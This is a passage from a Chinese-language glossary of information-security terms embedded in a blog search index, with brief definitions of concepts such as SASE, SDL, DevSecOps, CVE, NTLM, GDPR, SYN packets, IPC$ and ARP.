Assessment，即持续自适应风险与信任评估旨在通过动态智能分析来评估用户行为，放弃追求完美的安全，不能要求零风险，不要求100%信任，寻求一种0和1之间的风险与信任的平衡。 </p><p>CARTA战略是一个庞大的体系，其包括大数据、AI、机器学习、自动化、行为分析、威胁检测、安全防护、安全评估等方面。</p><h3 id="SASE"><a href="#SASE" class="headerlink" title="SASE"></a>SASE</h3><p>全称为Secure Access Service Edge，即安全访问服务边缘，Gartner将其定义为一种基于实体的身份、实时上下文、企业安全&#x2F;合规策略，以及在整个会话中持续评估风险&#x2F;信任的服务。 </p><p>实体的身份可与人员、人员组（分支办公室）、设备、应用、服务、物联网系统或边缘计算场地相关联。</p><h3 id="SDL"><a href="#SDL" class="headerlink" title="SDL"></a>SDL</h3><p>全称为Security Development Lifecycle，翻译为安全开发生命周期，是一个帮助开发人员构建更安全的软件和解决安全合规要求的同时降低开发成本的软件开发过程，最早由微软提出。</p><h3 id="DevSecOps"><a href="#DevSecOps" class="headerlink" title="DevSecOps"></a>DevSecOps</h3><p>全称为Development Security Operations，可翻译为安全开发与运维。 </p><p>它强调在DevOps计划刚启动时就要邀请安全团队来确保信息的安全性，制定自动安全防护计划，并贯穿始终，实现持续 IT 防护。</p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>顾名思义就是检查源代码中的安全缺陷，检查程序源代码是否存在安全隐患，或者有编码不规范的地方，通过自动化工具或者人工审查的方式，对程序源代码逐条进行检查和分析，发现这些源代码缺陷引发的安全漏洞，并提供代码修订措施和建议。</p><h3 id="NTLM验证"><a href="#NTLM验证" class="headerlink" title="NTLM验证"></a>NTLM验证</h3><p>NTLM(NT LAN Manager)是微软公司开发的一种身份验证机制，从NT4开始就一直使用，主要用于本地的帐号管理。</p><h3 id="MTTD"><a href="#MTTD" class="headerlink" title="MTTD"></a>MTTD</h3><p>平均检测时间。</p><h3 id="MTTR"><a href="#MTTR" class="headerlink" title="MTTR"></a>MTTR</h3><p>平均响应时间。</p><h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h3><p>全称Common Vulnerabilities and Exposures，由于安全机构Mitre维护一个国际通用的漏洞唯一编号方案，已经被安全业界广泛接受的标准。</p><h3 id="软件加壳"><a href="#软件加壳" class="headerlink" title="软件加壳"></a>软件加壳</h3><p>“壳”是一段专门负责保护软件不被非法修改或反编译的程序。 </p><p>它们一般都是先于程序运行，拿到控制权，然后完成它们保护软件的任务。 </p><p>经过加壳的软件在跟踪时已无法看到其真实的十六进制代码，因此可以起到保护软件的目的。</p><h3 id="CNVD"><a href="#CNVD" class="headerlink" title="CNVD"></a>CNVD</h3><p>国家信息安全漏洞共享平台，由国家计算机应急响应中心CNCERT维护，主要负责统一收集、管理国内的漏洞信息，其发布的漏洞编号前缀也为CNVD。</p><h3 id="数据脱敏"><a href="#数据脱敏" class="headerlink" title="数据脱敏"></a>数据脱敏</h3><p>数据脱敏是指对某些敏感信息通过脱敏规则进行数据的变形，实现敏感隐私数据的可靠保护，主要用于数据的共享和交易等涉及大范围数据流动的场景。</p><h3 id="GDPR"><a href="#GDPR" class="headerlink" title="GDPR"></a>GDPR</h3><p>《通用数据保护条例》（General Data Protection Regulation，简称GDPR）为欧洲联盟的条例，前身是欧盟在1995年制定的《计算机数据保护法》。</p><h3 id="CCPA"><a href="#CCPA" class="headerlink" title="CCPA"></a>CCPA</h3><p>美国加利福尼亚州消费者隐私保护法案。</p><h3 id="SRC"><a href="#SRC" class="headerlink" title="SRC"></a>SRC</h3><p>即Security Response Center，中文名为安全应急响应中心，主要职责为挖掘并公开收集机构存在的漏洞和其他安全隐患。</p><h3 id="CISO"><a href="#CISO" class="headerlink" title="CISO"></a>CISO</h3><p>有时也被叫做CSO，即首席信息安全官，为机构的主要安全负责人。</p><h3 id="IPC管道"><a href="#IPC管道" class="headerlink" title="IPC管道"></a>IPC管道</h3><p>为了更好地控制和处理不同进程之间的通信和数据交换，系统会通过一个特殊的连接管道来调度整个进程。</p><h3 id="SYN包"><a href="#SYN包" class="headerlink" title="SYN包"></a>SYN包</h3><p>TCP连接的第一个包，非常小的一种数据包。SYN攻击包括大量此类的包，由于这些包看上去来自实际不存在的站点，因此无法有效进行处理。</p><h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h3><p>是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。</p><h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h3><p>指的是一种命令指行环境，是系统与用户的交换方式界面。简单来说，就是系统与用户“沟通”的环境。 </p><p>我们平时常用到的DOS，就是一个shell。（Windows2000是cmd.exe）</p><h3 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h3><p>地址解析协议(Address Resolution Protocol)此协议将网络地址映射到硬件地址。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
